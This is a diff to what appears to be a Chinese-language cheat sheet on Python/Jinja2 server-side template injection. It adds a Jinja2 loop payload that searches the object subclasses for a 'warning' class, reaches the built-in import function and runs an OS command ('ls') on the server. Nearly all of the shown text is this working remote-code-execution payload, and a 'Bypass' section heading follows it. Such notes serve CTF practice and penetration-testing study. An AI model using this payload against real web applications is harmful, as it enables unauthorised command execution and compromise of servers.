@@ -29,6 +29,13 @@ or
 ''.__class__.__mro__[2].__subclasses__()
 
 看看有沒可用的 class
+
+善用迴圈的版本(不需要手動找)
+{% for x in ().__class__.__base__.__subclasses__() %}
+{% if "warning" in x.__name__ %}
+{{x()._module.__builtins__['__import__']('os').system("ls")}}
+{% endif %}
+{% endfor %}
 ```
 
 ## Bypass
